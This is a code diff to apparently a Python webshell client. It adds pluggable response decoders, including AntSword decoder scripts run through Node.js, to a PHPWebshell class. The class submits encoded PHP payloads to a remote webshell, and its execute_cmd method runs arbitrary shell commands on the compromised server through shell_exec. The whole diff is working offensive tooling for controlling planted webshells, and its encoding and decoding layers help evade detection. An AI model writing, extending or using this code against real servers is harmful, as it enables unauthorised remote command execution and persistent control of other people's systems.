@@ -10,11 +10,16 @@ import string
 import functools
 import uuid
 import hashlib
+import shutil
+import tempfile
+import subprocess
 import typing as t
+from pathlib import Path
 from binascii import Error as BinasciiError
 
 from . import exceptions
 
+# TODO: improve utils imports to avoid circular imports in the futures
 from ..utils import (
     random_english_words,
     random_user_agent,
@@ -22,7 +27,12 @@ from ..utils import (
     private_decrypt_rsa,
     encrypt_aes256_cbc,
     decrypt_aes256_cbc,
+    const,
 )
+
+# utils should be imported like this to avoid circular imports
+from ..utils.nodejs_bridge import nodejs_eval
+
 from .base import (
     PHPSessionInterface,
     DirectoryEntry,
@@ -34,13 +44,58 @@ logger = logging.getLogger("sessions.php")
 
 user_agent = random_user_agent()
 
-DECODER_RAW = """
-function decoder_echo_raw($s) {echo $s;}
-""".strip()
 
-DECODER_BASE64 = """
-function decoder_echo_raw($s) {echo base64_encode($s);}
-""".strip()
+class Decoder(t.TypedDict):
+    type: t.Literal["builtin", "antsword"]
+    phpcode: str  # 在加载失败时为空字符串
+    decode_response: t.Callable[[str], str]
+
+
+decoders: t.Dict[str, Decoder] = {
+    "raw": {
+        "type": "builtin",
+        "phpcode": "function decoder_echo_raw($s) {echo $s;}",
+        "decode_response": lambda x: x,
+    },
+    "base64": {
+        "type": "builtin",
+        "phpcode": "function decoder_echo_raw($s) {echo base64_encode($s);}",
+        "decode_response": lambda x: base64.b64decode(x).decode("utf-8"),
+    },
+}
+
+
+def get_antsword_decoder(filepath: Path) -> Decoder:
+    if shutil.which("node") is not None:
+        asenc = nodejs_eval(
+            filepath.read_text()
+            + "; console.log(JSON.stringify(module.exports.asoutput()))",
+            [],
+        )
+        print(asenc)
+        asenc = json.loads(asenc)
+        phpcode = asenc + "\nfunction decoder_echo_raw($s) {echo asenc($s);}"
+    else:
+        phpcode = ""
+
+    def decode_response(text: str):
+        return base64.b64decode(
+            nodejs_eval(
+                filepath.read_text()
+                + """
+                var code = JSON.parse(process.argv[2]);
+                console.log(module.exports.decode_buff(code).toString('base64'));
+                """,
+                [json.dumps(text)],
+            )
+        ).decode()
+
+    return {"type": "antsword", "phpcode": phpcode, "decode_response": decode_response}
+
+
+for decoder_file in const.ANTSWORD_DECODER_FOLDER.glob("*"):
+    decoders[decoder_file.name] = get_antsword_decoder(decoder_file)
+
 
 # session id was specified to avoid session
 # forget to save session id in cookie
@@ -568,8 +623,7 @@ php_webshell_conn_options = [
         placeholder="raw",
         default_value="raw",
         alternatives=[
-            {"name": "raw", "value": "raw"},
-            {"name": "base64", "value": "base64"},
+            {"name": decoder_name, "value": decoder_name} for decoder_name in decoders
         ],
     ),
     ConnOption(
@@ -648,11 +702,9 @@ class PHPWebshell(PHPSessionInterface):
         raise RuntimeError(f"Unsupported encoder: {self.encoder}")
 
     def decode(self, output: str) -> str:
-        if self.decoder == "raw":
-            return output
-        elif self.decoder == "base64":
-            return base64.b64decode(output).decode("utf-8")
-        raise RuntimeError(f"Unsupported encoder: {self.encoder}")
+        if self.decoder in decoders:
+            return decoders[self.decoder]["decode_response"](output)
+        raise exceptions.ServerError(f"Decoder not found: {self.decode}")
 
     async def execute_cmd(self, cmd: str) -> str:
         return await self.submit(f"decoder_echo(shell_exec({cmd!r}));")
@@ -1020,6 +1072,20 @@ class PHPWebshell(PHPSessionInterface):
 
         return wrap
 
+    def get_decoder_phpcode(self):
+        decoder = decoders[self.decoder]
+        if decoder["type"] == "builtin":
+            return decoder["phpcode"]
+        if decoder["type"] == "antsword":
+            if decoder["phpcode"] == "":
+                raise exceptions.ServerError(
+                    f"加载decoder{self.decoder}失败，也许你需要安装nodejs?"
+                )
+            return decoder["phpcode"]
+        raise NotImplementedError(
+            f"TODO: support decoder {self.decoder} {decoder['type']}"
+        )
+
     async def _submit(self, payload: str) -> str:
         """将php payload通过encoder编码后提交"""
         start, stop = (
@@ -1032,7 +1098,7 @@ class PHPWebshell(PHPSessionInterface):
             delimiter_stop=stop,
             payload_raw=payload,
             session_id=self.session_id,
-            decoder={"raw": DECODER_RAW, "base64": DECODER_BASE64}[self.decoder],
+            decoder=self.get_decoder_phpcode(),
         )
         payload = self.encode(payload)
         status_code, text = await self.submit_raw(payload)
